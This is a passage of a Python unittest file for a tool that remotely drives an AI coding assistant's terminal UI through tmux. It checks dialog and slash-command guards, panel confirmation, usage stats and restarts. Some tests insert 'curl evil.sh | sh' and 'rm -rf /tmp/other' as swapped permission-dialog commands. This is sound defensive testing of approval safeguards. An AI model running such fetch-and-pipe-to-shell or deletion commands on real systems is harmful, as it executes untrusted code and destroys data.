        self.assertEqual(m.get_meta(sid)["state"], "idle")
        self.assertEqual(len(self.rem.ops("kill")), n_kill)
        self.assertTrue(self.rem.keeper)
        m.send_message(sid, "还活着")
        self.assertTrue(wait_until(lambda: "● 回复：还活着" in m.get_screen(sid)["text"]))

    def test_exited_while_starting_ignored(self):
        m = self.mgr()
        gate = threading.Event()
        orig = StubLink.ensure_keeper

        def slow(link_self, timeout=120):
            gate.wait(5)
            return orig(link_self, timeout)
        with mock.patch.object(StubLink, "ensure_keeper", slow):
            sid = m.create(jobid="12345", cwd="~")["sid"]
            m._on_link_event("12345", {"ev": "exited", "sid": sid, "exit_status": 1})
            time.sleep(0.1)
            gate.set()
            self.assertTrue(wait_until(lambda: m.get_meta(sid)["state"] == "idle"))
        self.assertEqual(self.rem.ops("kill"), [])

    def test_genuine_exit_still_cleaned(self):
        m = self.mgr()
        sid = self.start(m)
        self.tui(sid).dead, self.tui(sid).exit_status = True, 0
        m.send_keys(sid, ["Escape"])                   # 触发 stub 推送带 pane_pid 的 exited
        self.assertTrue(wait_until(lambda: m.get_meta(sid)["state"] == "exited"))
        self.assertTrue(wait_until(lambda: not self.rem.tuis and not self.rem.keeper))
        self.assertEqual(m.get_meta(sid)["exit_status"], 0)


class TestSubmitGuards(Base):
    """中 3：粘贴后先确认，绝不把 Enter 打进新弹出的对话框；slash 命令先确认补全高亮项。"""

    def test_dialog_pops_right_after_paste(self):
        m = self.mgr()
        sid = self.start(m)
        t = self.tui(sid)

        def pop(tt):
            tt.view, tt.sel, tt.on_paste = "perm", 0, None   # 粘贴的同时弹出权限框（忙时排队发消息）
        t.on_paste = pop
        with self.assertRaises(S.OpError) as cm:
            m.send_message(sid, "排队的消息")
        self.assertEqual((cm.exception.api_code, cm.exception.http_status), ("dialog_open", 409))
        self.assertEqual((self.rem.submits(sid), self.rem.keys_sent(sid)), ([], []))
        self.assertEqual(t.view, "perm")                    # 权限框原样留给用户：没有被 Enter 批准
        self.assertFalse(any("chose" in l for l in t.content))

    def test_dialog_pops_between_check_and_enter(self):
        m = self.mgr()
        sid = self.start(m)
        t = self.tui(sid)

        def pop(tt, p):
            if p["keys"] == ["Enter"]:
                tt.view, tt.sel = "perm", 0
                self.rem.before_guard = None
        self.rem.before_guard = pop                         # agent 发 Enter 前那一刻才弹出
        with self.assertRaises(S.OpError) as cm:
            m.send_message(sid, "hello")
        self.assertEqual((cm.exception.api_code, cm.exception.http_status), ("screen_changed", 409))
        self.assertEqual(t.view, "perm")
        self.assertFalse(any("chose" in l for l in t.content))

    def test_status_waiting_counts_as_dialog(self):
        m = self.mgr()
        sid = self.start(m)
        t = self.tui(sid)
        t.status = lambda: "waiting"                         # claude 说在等审批，但屏幕没解析出对话框
        m.send_keys(sid, ["Space"])
        self.assertTrue(wait_until(lambda: m.get_meta(sid)["state"] == "waiting"))
        n = len(self.rem.ops("paste"))
        with self.assertRaises(S.OpError) as cm:
            m.send_message(sid, "x")
        self.assertEqual(cm.exception.api_code, "dialog_open")
        self.assertEqual(len(self.rem.ops("paste")), n)
        t.status = lambda: "idle"                            # session 事件滞后：list 读到最新值就放行
        m.send_message(sid, "x")
        self.assertEqual(self.rem.ops("paste")[-1]["text"], "x")

    def test_slash_highlight_must_match(self):
        m = self.mgr()
        sid = self.start(m)
        t = self.tui(sid)
        t.popup = [("/model-foo", "自定义命令"), ("/model", "Switch model")]
        with self.assertRaises(S.OpError) as cm:
            m.open_model_picker(sid)
        self.assertEqual((cm.exception.api_code, cm.exception.http_status), ("slash_mismatch", 409))
        self.assertEqual(self.rem.submits(sid), [])
        self.assertEqual((t.view, t.input), ("idle", "/model"))      # 文字留在输入框，没执行任何命令
        t.input, t.popup = "", [("/todos", "List todos")]
        with self.assertRaises(S.OpError) as cm:
            m.send_message(sid, "/tool 帮我看看")                     # 用户自己输入的 / 消息同理
        self.assertEqual(cm.exception.api_code, "slash_mismatch")
        t.input = ""
        t.popup = [("/model", "Switch model (currently Haiku)"), ("/model-foo", "x")]
        r = m.open_model_picker(sid)                                   # 高亮项正好是目标命令：放行
        self.assertEqual(len(r["rows"]), 6)
        self.assertEqual(self.rem.submits(sid)[-1]["guard"]["popup"], "/model")
        m.cancel_dialog(sid)
        self.assertTrue(wait_until(lambda: self.tui(sid).view == "idle"))
        # /exit 也一样：高亮的是 /exit-all 就不按 Enter，关闭改为 kill tmux 会话
        t.popup = [("/exit-all", "自定义命令"), ("/exit", "Exit the CLI")]
        n = len(self.rem.submits(sid))
        m.close(sid)
        self.assertEqual(len(self.rem.submits(sid)), n)
        self.assertEqual(self.rem.ops("kill")[-1], {"sid": sid})
        self.assertEqual(m.get_meta(sid)["state"], "exited")

    def test_slash_popup_appears_just_before_enter(self):
        m = self.mgr()
        sid = self.start(m)
        t = self.tui(sid)

        def late(tt, p):
            if p["keys"] == ["Enter"]:
                tt.popup = [("/model-foo", "x")]
                self.rem.before_guard = None
        self.rem.before_guard = late
        with self.assertRaises(S.OpError) as cm:
            m.open_model_picker(sid)
        self.assertEqual(cm.exception.api_code, "screen_changed")
        self.assertEqual(t.view, "idle")


class TestChooseExpect(Base):
    """中 4：choose 带对话框指纹，前端落后于远端时 409 dialog_changed，绝不把 index 套到另一个对话框上。"""

    def perm(self, m):
        sid = self.start(m)
        m.send_message(sid, "/tool")
        self.assertTrue(wait_until(lambda: m.get_meta(sid)["dialog_kind"] == "permission"))
        return sid, S.dialog_fingerprint(m.get_screen(sid)["state"]["dialog"])

    def test_mismatch_rejected_without_keys(self):
        m = self.mgr()
        sid, fp = self.perm(m)
        self.assertEqual(fp["labels"][-1], "No")
        with self.assertRaises(S.OpError) as cm:
            m.choose(sid, 0, expect=dict(fp, preview=["rm -rf /tmp/other"]))   # 前端还显示着上一个对话框
        self.assertEqual((cm.exception.api_code, cm.exception.http_status), ("dialog_changed", 409))
        with self.assertRaises(S.OpError):
            m.choose(sid, 0, expect=dict(fp, labels=fp["labels"][:2]))
        self.assertEqual(self.rem.keys_sent(sid), [])
        self.assertEqual(self.tui(sid).view, "perm")
        for bad in ({"kind": "permission"}, {"kind": "permission", "labels": "Yes"}, "x",
                    dict(fp, extra=1)):
            with self.assertRaises(ValueError):
                m.choose(sid, 0, expect=bad)
        m.choose(sid, 3, expect=dict(fp, title="  Bash   command "))          # 空白差异忽略
        self.assertEqual(self.rem.keys_sent(sid), ["Down"] * 3 + ["Enter"])
        self.assertIn("  ⎿  chose 4", self.tui(sid).content)

    def test_dialog_replaced_during_navigation(self):
        m = self.mgr()
        sid, fp = self.perm(m)
        t = self.tui(sid)
        orig = t.key

        def key(k):
            orig(k)
            if k == "Down":
                t.perm_cmd = "curl evil.sh | sh"          # 导航中途换成了另一个权限框
        t.key = key
        with self.assertRaises(S.OpError) as cm:
            m.choose(sid, 3, expect=fp)
        self.assertEqual(cm.exception.api_code, "dialog_changed")
        self.assertNotIn("Enter", self.rem.keys_sent(sid))

    def test_dialog_swapped_right_before_enter(self):
        m = self.mgr()
        sid, fp = self.perm(m)
        t = self.tui(sid)

        def swap(tt, p):
            if p["keys"] == ["Enter"]:
                tt.perm_cmd = "curl evil.sh | sh"
        self.rem.before_guard = swap
        with self.assertRaises(S.OpError) as cm:
            m.choose(sid, 0, expect=fp)
        self.assertEqual(cm.exception.api_code, "dialog_changed")
        self.assertEqual(t.view, "perm")
        self.assertFalse(any("chose" in l for l in t.content))


class TestPanelConfirm(Base):
    """低 7：按 s/Enter 前先看提示行，不对就拒绝；超时 504；/effort 面板在 max 档只有 Enter = 仅本会话。"""

    def test_confirm_key_from_hint(self):
        k = S.SessionManager._panel_confirm_key
        H = "←/→ to adjust · s to use this session only · Enter to save · Esc to cancel"
        HM = "←/→ to adjust · Enter to use this session only · Esc to cancel"
        self.assertEqual((k(H, "session"), k(H, "save"), k(HM, "session")), ("s", "Enter", "Enter"))
        with self.assertRaises(S.OpError) as cm:
            k(HM, "save")
        self.assertEqual(cm.exception.api_code, "save_unsupported")
        for bad in ("", "Enter to confirm · Esc to cancel", "Tab to toggle", "Enter to select"):
            for scope in ("session", "save"):
                with self.assertRaises(S.OpError) as cm:
                    k(bad, scope)
                self.assertEqual(cm.exception.api_code, "unexpected_panel")

    def test_effort_max(self):
        m = self.mgr()
        sid = self.start(m)
        r = m.apply_effort(sid, "max", "session")
        keys = self.rem.keys_sent(sid)
        self.assertEqual(keys[-1], "Enter")
        self.assertNotIn("s", keys)
        self.assertNotIn("Tab", keys)                 # 绝不碰 Ultracode
        self.assertEqual(self.tui(sid).saved, [])     # 没有保存为默认
        self.assertEqual(m.get_meta(sid)["effort"], "max")
        self.assertIn("max", r["result"])
        n = len(self.rem.keys_sent(sid))
        with self.assertRaises(S.OpError) as cm:
            m.apply_effort(sid, "max", "save")
        self.assertEqual(cm.exception.api_code, "save_unsupported")
        self.assertEqual(self.tui(sid).view, "effort")   # 没按确认键，面板留给用户
        self.assertEqual(self.rem.keys_sent(sid)[n:], [])
        self.assertEqual(self.tui(sid).saved, [])
        m.cancel_dialog(sid)

    def test_wrong_hint_refused_and_timeout_504(self):
        m = self.mgr()
        sid = self.start(m)
        t = self.tui(sid)
        t.effort_hint = "Enter to confirm · Esc to cancel"
        with self.assertRaises(S.OpError) as cm:
            m.apply_effort(sid, "low", "session")
        self.assertEqual(cm.exception.api_code, "unexpected_panel")
        self.assertEqual([k for k in self.rem.keys_sent(sid) if k in ("s", "Enter")], [])
        m.cancel_dialog(sid)
        t.effort_hint = None
        t.ignore_confirm = True
        with self.assertRaises(S.OpError) as cm:
            m.apply_effort(sid, "low", "session")
        self.assertEqual((cm.exception.api_code, cm.exception.http_status), ("panel_timeout", 504))
        self.assertEqual(m.get_meta(sid)["effort"], "low")

    def test_hint_changes_before_key_guard(self):
        m = self.mgr()
        sid = self.start(m)

        def bump(tt, p):
            if p["keys"] == ["s"]:
                tt.panel_effort = "max"               # 用户在终端里把档位调到了 max：提示行已变
                self.rem.before_guard = None
        self.rem.before_guard = bump
        with self.assertRaises(S.OpError) as cm:
            m.apply_effort(sid, "high", "session")
        self.assertEqual(cm.exception.api_code, "screen_changed")
        self.assertEqual(self.tui(sid).view, "effort")


# ============================================================================ fake 端到端
def _e2e_available():
    try:
        import ccr.agent_link  # noqa: F401
    except Exception:  # noqa: BLE001
        return False
    root = pathlib.Path(__file__).resolve().parent.parent
    return (root / "ccr" / "fake_tui.py").exists() and (shutil.which("tmux") or os.path.exists(
        "/opt/homebrew/bin/tmux"))


# ============================================================================ 统计（meta.stats）
FIX = pathlib.Path(__file__).resolve().parent.parent / "fixtures"


def _stream_frames():
    with open(FIX / "tui_screens_stream.ndjson", encoding="utf-8") as f:
        for line in f:
            d = json.loads(line)
            if "frames" in d:
                return [x["s"] for x in d["frames"]]
    raise AssertionError("no stream_frames")


def _fixture_transcript():
    with open(FIX / "transcript_interactive_59dd443a.jsonl", encoding="utf-8") as f:
        return [e for e in (json.loads(l) for l in f if l.strip())
                if e.get("type") in ("user", "assistant", "system") and not e.get("isSidechain")]


class TestStats(Base):
    """上下文 / 花费 / token/s：只读屏幕与 transcript；meta 推送节流（值变化且距上次 ≥ stats_interval）。"""

    def screen(self, m, sid, text):
        m._on_link_event("12345", {"ev": "screen", "sid": sid, "text": text, "ts": time.time()})

    def test_stats_from_real_frames_and_throttle(self):
        m = self.mgr()
        m.stats_interval = 0.3
        sid = self.start(m)
        st0 = m.get_meta(sid)["stats"]
        self.assertEqual((st0["context_pct"], st0["context_source"], st0["cost_usd"]), (0.0, "status", None))
        sub = m.subscribe()
        frames = _stream_frames()
        for text in frames:
            self.screen(m, sid, text)
            time.sleep(0.03)
        self.assertTrue(wait_until(lambda: (m.get_meta(sid)["stats"] or {}).get("tok_s_last") == 35.2, 3),
                        m.get_meta(sid)["stats"])
        st = m.get_meta(sid)["stats"]
        self.assertEqual((st["context_used"], st["context_limit"], st["context_pct"], st["context_source"]),
                         (25000, 1000000, 3.0, "status"))
        self.assertEqual((st["cost_text"], st["cost_source"], st["tok_s_live"]), ("$0.0000", "status", None))
        self.assertEqual((st["last_turn_tokens"], st["last_turn_elapsed_s"]), (211, 6.0))
        self.assertIsInstance(st["updated_at"], float)
        metas = []
        while True:
            e = sub.get(timeout=0.05)
            if e is None:
                break
            if e["kind"] == "app" and e["data"].get("type") == "meta":
                metas.append(e)
        sub.close()
        self.assertLess(len(metas), len(frames))   # 不是每帧都推 meta
        changes, prev = [], st0
        for e in metas:
            cur = e["data"]["meta"]["stats"]
            if not S._stats_same(cur, prev):
                changes.append(e["ts"])
                prev = cur
        self.assertGreaterEqual(len(changes), 2)
        gaps = [b - a for a, b in zip(changes, changes[1:])]
        self.assertTrue(all(g >= 0.25 for g in gaps), gaps)   # 统计变化最多每 0.3s 推一次
        self.assertTrue(S._stats_same(prev, st))              # 最后一次推送就是最终值（定时器补发）

    def test_live_rate_then_exit(self):
        m = self.mgr()
        m.stats_interval = 0.05
        sid = self.start(m)
        tpl = ("✶ Brewing… (%ds · ↓ %d tokens · thinking with low effort)\n" + RULE + "\n❯ \n" + RULE +
               "\n  u@node ▱▱▱ 4%% 40k/1M $0.0120 [Haiku 5.5 · 1M · effort:low]"
               "\n  ⏵⏵ auto mode on (shift+tab to cycle) · esc to interrupt")
        for i in range(6):
            self.screen(m, sid, tpl % (3 + i // 2, 100 + 60 * i))
            time.sleep(0.15)
        self.assertTrue(wait_until(lambda: ((m.get_meta(sid)["stats"] or {}).get("tok_s_live") or 0) > 100, 2),
                        m.get_meta(sid)["stats"])
        st = m.get_meta(sid)["stats"]
        self.assertEqual((st["context_used"], st["cost_text"]), (40000, "$0.0120"))
        self.assertLess(st["tok_s_live"], 600)
        m._mark_exited(m._get(sid), 0)
        self.assertTrue(wait_until(lambda: m.get_meta(sid)["stats"]["tok_s_live"] is None, 2))
        self.assertEqual(m.get_meta(sid)["stats"]["cost_text"], "$0.0120")   # 退出后保留最后已知值

    def test_transcript_fallback_limit_and_persist(self):
        with mock.patch.object(SimTUI, "SHOW_STATUS", False):
            m = self.mgr()
            m.stats_interval = 0.05
            sid = self.start(m)
            self.assertIsNone(m.get_meta(sid)["stats"])
            m._on_link_event("12345", {"ev": "transcript", "sid": sid, "session_id": UUID1,
                                       "entries": _fixture_transcript(), "reset": True})
            self.assertTrue(wait_until(lambda: m.get_meta(sid)["stats"] is not None, 2))
            st = m.get_meta(sid)["stats"]
            self.assertEqual((st["context_used"], st["context_limit"], st["context_source"], st["context_approx"]),
                             (26050, 200000, "transcript", True))
            self.assertIsNone(st["cost_usd"])
            # 1M 模型（启动参数里有 [1m]）→ 上限 1,000,000
            sid2 = self.start(m, model="claude-fable-5-1[1m]")
            m._on_link_event("12345", {"ev": "transcript", "sid": sid2, "session_id": UUID2,
                                       "entries": _fixture_transcript(), "reset": True})
            self.assertTrue(wait_until(lambda: (m.get_meta(sid2)["stats"] or {}).get("context_limit") == 1000000, 2),
                            m.get_meta(sid2)["stats"])
            # 关闭后 app 重启：已退出会话保留最后已知统计（sessions.json 里也有）
            m.close(sid)
            before = m.get_meta(sid)["stats"]
            m.shutdown()
            m2 = self.mgr()
            after = m2.get_meta(sid)["stats"]
            self.assertEqual(after["context_used"], 26050)
            self.assertTrue(S._stats_same(dict(after, updated_at=None), dict(before, updated_at=None)))
            raw = json.loads((pathlib.Path(self.tmp) / "sessions.json").read_text())
            self.assertTrue(any((r["meta"].get("stats") or {}).get("context_used") == 26050 for r in raw["sessions"]))

    def test_bad_persisted_stats_ignored(self):
        m = self.mgr()
        sid = self.start(m)
        m.close(sid)
        m.shutdown()
        p = pathlib.Path(self.tmp) / "sessions.json"
        data = json.loads(p.read_text())
        data["sessions"][0]["meta"]["stats"] = {"context_used": "lots", "cost_text": "<b>", "tok_s_live": 9}
        p.write_text(json.dumps(data))
        m2 = self.mgr()
        self.assertIsNone(m2.get_meta(sid)["stats"])


@unittest.skipUnless(_e2e_available(), "需要 ccr.agent_link + ccr/fake_tui.py + 本机 tmux")
class TestFakeEndToEnd(unittest.TestCase):
    """真实 AgentLink（fake 模式）+ node_agent + 本机 tmux + fake_tui。"""

    def setUp(self):
        self.tmp = tempfile.mkdtemp(prefix="ccr-e2e-", dir="/tmp")
        self.home = os.path.join(self.tmp, "home")
        self.tmuxdir = os.path.join(self.tmp, "tmux")
        os.makedirs(os.path.join(self.home, "proj"))
        os.makedirs(self.tmuxdir)
        self.data = os.path.join(self.tmp, "data")
        self.cfg = {"host": "gpu-cluster", "jobid": "12345", "default_cwd": "~", "fake": True,
                    "fake_home": self.home, "fake_tmpdir": self.tmuxdir, "fake_tmux": shutil.which("tmux")
                    or "/opt/homebrew/bin/tmux"}
        self.addCleanup(self._cleanup)

    def _cleanup(self):
        import subprocess
        env = dict(os.environ, TMUX_TMPDIR=self.tmuxdir)
        subprocess.run([self.cfg["fake_tmux"], "-L", "ccr", "-f", "/dev/null", "kill-server"], env=env,
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=10)
        shutil.rmtree(self.tmp, True)

    def mgr(self):
        m = S.SessionManager(lambda: dict(self.cfg), pathlib.Path(self.data))
        m.exit_timeout = 8
        self.addCleanup(lambda: m._shutdown or m.shutdown())
        return m

    def wait_state(self, m, sid, states, timeout=20):
        ok = wait_until(lambda: m.get_meta(sid)["state"] in states, timeout, 0.1)
        self.assertTrue(ok, (m.get_meta(sid), m.get_screen(sid)["text"]))

    def wait_dialog(self, m, sid, timeout=10):
        """session status 可能先于画面变成 waiting（state=waiting 但对话框还没画出来）：等对话框真正出现。"""
        ok = wait_until(lambda: m.get_screen(sid)["state"].get("dialog") is not None, timeout, 0.05)
        self.assertTrue(ok, m.get_screen(sid)["text"])
        return m.get_screen(sid)["state"]["dialog"]

    def test_full_flow(self):
        m = self.mgr()
        sid = m.create(jobid="12345", cwd="~/proj", title="e2e")["sid"]
        self.wait_state(m, sid, ("idle", "trust"))
        if m.get_meta(sid)["state"] == "trust":
            d = m.get_screen(sid)["state"]["dialog"]
            yes = next(o["index"] for o in d["options"] if o["label"].startswith("Yes"))
            m.choose(sid, yes)
            self.wait_state(m, sid, ("idle",))
        # 消息 → transcript
        m.send_message(sid, "你好，fake")
        self.assertTrue(wait_until(lambda: any(
            e["kind"] == "transcript" and any(x.get("type") == "assistant" for x in e["data"]["entries"])
            for e in m.session_events(sid)), 20, 0.1), m.get_screen(sid)["text"])
        self.wait_state(m, sid, ("idle",))
        # 权限框
        m.send_message(sid, "/tool")
        self.wait_state(m, sid, ("waiting",))
        d = self.wait_dialog(m, sid)
        self.assertEqual(d["kind"], "permission", m.get_screen(sid)["text"])
        no = next(o["index"] for o in d["options"] if o["label"] == "No")
        m.choose(sid, no)
        self.wait_state(m, sid, ("idle", "busy"))
        self.wait_state(m, sid, ("idle",))
        # AskUserQuestion：Type something. + 自由文字
        m.send_message(sid, "/ask")
        self.wait_state(m, sid, ("waiting",))
        d = self.wait_dialog(m, sid)
        self.assertEqual(d["kind"], "question", m.get_screen(sid)["text"])
        free = next(o["index"] for o in d["options"] if o.get("free_text"))
        m.choose(sid, free, text="绿色")
        self.wait_state(m, sid, ("idle",))
        self.assertTrue(wait_until(lambda: "绿色" in m.get_screen(sid)["text"], 10, 0.1), m.get_screen(sid)["text"])
        # Write 权限框（选项折行）
        m.send_message(sid, "/write")
        self.wait_state(m, sid, ("waiting",))
        d = self.wait_dialog(m, sid)
        self.assertEqual(d["kind"], "permission", m.get_screen(sid)["text"])
        self.assertEqual(d["tool"], "Create file")
        m.cancel_dialog(sid)
        self.wait_state(m, sid, ("idle",))
        # 模型面板
        r = m.open_model_picker(sid)
        self.assertEqual(len(r["rows"]), 6, r)
        self.assertEqual(sum(1 for x in r["rows"] if x["current"]), 1)
        target = next(x["index"] for x in r["rows"] if not x["current"])
        res = m.apply_model(sid, target, effort="medium", scope="session")
        self.assertIsNone(res["state"]["dialog"])
        self.assertTrue(res["result"].startswith("Set model to"), res["result"])
        self.assertIn(m.get_meta(sid)["model"], res["result"])
        self.assertEqual(m.get_meta(sid)["effort"], "medium")
        self.wait_state(m, sid, ("idle",))
        # effort
        res = m.apply_effort(sid, "high", "session")
        self.assertIsNone(res["state"]["dialog"], m.get_screen(sid)["text"])
        # 模式切换
        mode0 = m.get_meta(sid)["mode"]
        m.cycle_mode(sid)
        self.assertTrue(wait_until(lambda: m.get_meta(sid)["mode"] != mode0, 5, 0.1))
        # app 重启：不关闭远端，重新附着
        m.shutdown()
        m2 = self.mgr()
        self.assertTrue(wait_until(lambda: m2.get_meta(sid)["link"] == "ready", 20, 0.1))
        self.wait_state(m2, sid, ("idle",))
        m2.send_message(sid, "重启后还在吗")
        self.assertTrue(wait_until(lambda: "重启后还在吗" in m2.get_screen(sid)["text"], 10, 0.1))
        self.wait_state(m2, sid, ("idle",), 20)
        # 关闭
        m2.close(sid)
        self.assertEqual(m2.get_meta(sid)["state"], "exited")
        self.assertIsNotNone(m2.get_meta(sid)["claude_session_id"])

    def _ready(self, m, cwd="~/proj"):
        sid = m.create(jobid="12345", cwd=cwd, title="stats")["sid"]
        self.wait_state(m, sid, ("idle", "trust"))
        if m.get_meta(sid)["state"] == "trust":
            d = m.get_screen(sid)["state"]["dialog"]
            m.choose(sid, next(o["index"] for o in d["options"] if o["label"].startswith("Yes")))
            self.wait_state(m, sid, ("idle",))
        return sid

    def stats(self, m, sid):
        return m.get_meta(sid)["stats"] or {}

    def test_stats_from_fake_statusline(self):
        """fake_tui 画与真机同格式的状态栏 "0% 0/1M $0.0000" 与 spinner "(3s · ↓ 12 tokens · …)"。"""
        self.cfg["fake_env"] = {"CCR_FAKE_DELAY": "0.08"}
        m = self.mgr()
        sid = self._ready(m)
        self.assertTrue(wait_until(lambda: self.stats(m, sid).get("cost_text") == "$0.0000", 5), self.stats(m, sid))
        st = self.stats(m, sid)
        self.assertEqual((st["context_used"], st["context_limit"], st["context_source"]), (0, 1000000, "status"))
        m.send_message(sid, "/long")
        self.assertTrue(wait_until(lambda: (self.stats(m, sid).get("tok_s_live") or 0) > 0, 15, 0.1),
                        (self.stats(m, sid), m.get_screen(sid)["text"]))
        self.assertLess(self.stats(m, sid)["tok_s_live"], 200)
        m.interrupt(sid)
        self.wait_state(m, sid, ("idle",))
        self.assertTrue(wait_until(lambda: self.stats(m, sid).get("tok_s_live") is None
                                   and self.stats(m, sid).get("tok_s_last"), 5), self.stats(m, sid))
        m.send_message(sid, "你好")
        self.assertTrue(wait_until(lambda: self.stats(m, sid).get("cost_text") == "$0.0004", 15, 0.1),
                        (self.stats(m, sid), m.get_screen(sid)["text"]))
        self.assertEqual(self.stats(m, sid)["context_used"], 1000)

    def test_stats_fallback_without_statusline(self):
        """没有状态栏：上下文 = transcript 最近一条回复的 usage（约，上限按模型推断），花费 = None。"""
        self.cfg["fake_env"] = {"CCR_FAKE_STATUSLINE": "0", "CCR_FAKE_DELAY": "0.05"}
        m = self.mgr()
        sid = self._ready(m)
        self.assertIsNone(m.get_screen(sid)["state"]["status_line"])
        m.send_message(sid, "你好")
        self.assertTrue(wait_until(lambda: self.stats(m, sid).get("context_source") == "transcript", 15, 0.1),
                        (self.stats(m, sid), m.get_screen(sid)["text"]))
        st = self.stats(m, sid)
        self.assertEqual((st["context_used"], st["context_limit"], st["context_approx"]), (1202, 200000, True))
        self.assertIsNone(st["cost_usd"])
        self.assertIsNone(st["cost_source"])

    def test_restart_cycles_and_effort_max(self):
        """中 2：同一 sid 在同一作业上反复重启，迟到的 exited 不会 kill 新会话、不会卡在 starting；
        低 7：/effort 在 max 档只有 Enter = 仅本会话（不能保存）；低 8：作业无会话后 link 关闭。"""
        m = self.mgr()
        sid = m.create(jobid="12345", cwd="~/proj", title="cycles")["sid"]
        self.wait_state(m, sid, ("idle", "trust"))
        if m.get_meta(sid)["state"] == "trust":
            d = m.get_screen(sid)["state"]["dialog"]
            m.choose(sid, next(o["index"] for o in d["options"] if o["label"].startswith("Yes")))
            self.wait_state(m, sid, ("idle",))
        for i in range(3):
            m.restart(sid)
            self.wait_state(m, sid, ("idle", "trust"))
            time.sleep(1.5)                         # 给迟到的旧代际事件留出时间
            self.assertEqual(m.get_meta(sid)["state"], "idle", m.get_screen(sid)["text"])
            word = "第%d轮" % i
            m.send_message(sid, word)
            self.assertTrue(wait_until(lambda: (m.get_screen(sid)["state"].get("echo") or "").startswith(word)
                                       and m.get_screen(sid)["state"].get("turn_done")
                                       and not m.get_screen(sid)["state"].get("busy"), 20, 0.1),
                            m.get_screen(sid)["text"])
            self.wait_state(m, sid, ("idle",), 20)
        self.assertEqual(len([e for e in m.session_events(sid) if e["data"].get("type") == "exit"]), 3)
        res = m.apply_effort(sid, "max", "session")
        self.assertIn("max", res["result"] or "", m.get_screen(sid)["text"])
        self.assertEqual(m.get_meta(sid)["effort"], "max")
        self.wait_state(m, sid, ("idle",))
        with self.assertRaises(S.OpError) as cm:
            m.apply_effort(sid, "max", "save")
        self.assertEqual(cm.exception.api_code, "save_unsupported")
        self.assertEqual(m.get_screen(sid)["state"]["dialog"]["kind"], "effort")
        m.cancel_dialog(sid)
        self.wait_state(m, sid, ("idle",))
        m.close(sid)
        self.assertEqual(m.get_meta(sid)["state"], "exited")
        self.assertTrue(wait_until(lambda: not m._links, 10, 0.1))


if __name__ == "__main__":
    unittest.main()


class TestResumeNeedsConversation(unittest.TestCase):
    """新会话还没有任何对话时 --resume 会报 No conversation found：重启（如换 API）应以新会话启动。"""

    def test_conversation_entry_detection(self):
        from ccr.session import _is_conversation_entry as conv
        self.assertTrue(conv({"type": "assistant", "message": {"content": [{"type": "text", "text": "hi"}]}}))
        self.assertTrue(conv({"type": "user", "message": {"content": "你好"}}))
        self.assertTrue(conv({"type": "user", "message": {"content": [{"type": "text", "text": "看这张图"},
                                                                        {"type": "image"}]}}))
        self.assertFalse(conv({"type": "system", "subtype": "local_command", "content": "/model"}))
        self.assertFalse(conv({"type": "user", "isMeta": True, "message": {"content": "x"}}))
        self.assertFalse(conv({"type": "user", "message": {"content": "<command-name>/model</command-name>"}}))
        self.assertFalse(conv({"type": "user", "message": {"content": "<local-command-stdout>Kept model</local-command-stdout>"}}))
        self.assertFalse(conv({"type": "assistant", "isSidechain": True, "message": {"content": []}}))

    def test_no_conversation_regex(self):
        from ccr.session import _NO_CONV_RE
        m = _NO_CONV_RE.search("\nNo conversation found with session ID: 568f81ee-984e-4564-bbb4-c4f452c30a5a\n")
        self.assertEqual(m.group(1), "568f81ee-984e-4564-bbb4-c4f452c30a5a")
